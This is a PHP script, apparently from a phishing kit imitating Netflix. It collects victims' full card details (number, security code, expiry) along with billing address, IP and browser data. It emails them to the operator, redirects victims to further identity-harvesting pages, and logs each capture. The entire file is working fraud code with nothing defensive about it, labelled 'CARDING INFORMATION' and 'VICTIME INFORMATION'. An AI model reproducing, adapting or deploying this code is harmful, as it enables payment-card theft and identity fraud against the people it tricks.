<?php
session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../../RGN/functions/Email.php');
include('../../../RGN/functions/get_bin.php');
include('../../../RGN/functions/get_browser.php');
$_SESSION['_cardholder_'] = strtoupper($_SESSION['_nameoncard_']);
$_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);
$Z118_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>ACCOUNT Νеtflіx</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>CARDING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_nameoncard_']."</font><br>
<font style='color:#9c0000;'>✪</font> [".strtolower($_SESSION['_c_type_'])." Card Number] = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']." (".strtolower($_SESSION['_c_type_']).")</font><br>
<font style='color:#9c0000;'>✪</font> [Card Security Code]	= <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Expiration Date] = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>BILLING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Full Name] = <font style='color:#0070ba;'>".$_SESSION['_fullname_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Address line] = <font style='color:#0070ba;'>".$_SESSION['_address_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Country Name] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_COUNTRY_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Town/City] = <font style='color:#0070ba;'>".$_SESSION['_city_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Province/State] = <font style='color:#0070ba;'>".$_SESSION['_state_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Postal/Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_zipCode_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## <font style='color: #820000;'>BY DWM+18</font> #####################
</div></html>\n";

if ($_SESSION['_c_type_'] == "VISA" || $_SESSION['_c_type_'] == "VISA ELECTRON" || $_SESSION['_c_type_'] == "MASTERCARD" || $_SESSION['_c_type_'] == "MAESTRO"){ // FOR VBV CARD 
    $Z118_SUBJECT = "".$_SESSION['_login_email_']." ✪ ".$_SESSION['_ip_']." ✪";
    $Z118_HEADERS .= "From:DWM+18_NT+CC <noreply@cssc.com>";
    $Z118_HEADERS .= $_POST['eMailAdd']."\n";
    $Z118_HEADERS .= "MIME-Version: 1.0\n";
    $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
	@mail($RouGani, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	if ($_SESSION['_cntrcode_'] == "FR" || $_SESSION['_cntrcode_'] == "ES" || $_SESSION['_cntrcode_'] == "NO"){
	    HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
	}else {
		HEADER("Location: ../security/?secure_code=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
	}
}
else{ // FOR CC CARD
    $Z118_SUBJECT = "✪ ".$_SESSION['_ip_']." ✪ ".$_SESSION['_login_email_']." ✪";
    $Z118_HEADERS .= "From:DWM+18_NT+CC <noreply@cssc.com>";
    $Z118_HEADERS .= $_POST['eMailAdd']."\n";
    $Z118_HEADERS .= "MIME-Version: 1.0\n";
    $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($RouGani, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
}

////////////////////////////////////////////////// RouGani //////////////////////////////////////////////

		
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

date_default_timezone_set('Africa/Tunis');
$TIME = date("d-m-Y H:i:s"); 
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ;
$ip = getenv("REMOTE_ADDR");
$OS =getOS($_SERVER['HTTP_USER_AGENT']);
$file = fopen("../../../logs.txt","a");
fwrite($file,"".$TIME." - ".$COUNTRY." - ".$OS." - ".$ip."                => BILLING DONE ! \n")  ;
?>